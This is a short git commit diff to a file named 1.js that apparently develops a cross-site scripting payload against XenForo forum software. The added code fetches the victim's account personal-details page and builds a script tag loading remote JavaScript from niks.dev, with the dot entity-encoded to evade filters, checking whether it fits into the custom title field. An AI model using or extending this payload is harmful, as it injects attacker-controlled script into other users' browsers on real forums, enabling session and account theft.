be6eb229f39064f3b1a6d25ed9a4cf2380b87749
niksdev09 <59556607+niksdev09@users.noreply.github.com>
2025-04-06 16:11:34 +0300

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,5 @@
-alert()
+let custom_title = await XenForo.ajax("account/personal-details");
+let payload = "<script src='//niks&#46;dev/1.js'>"
+if (custom_title.length < 64-payload.length) {
+ alert()
+}
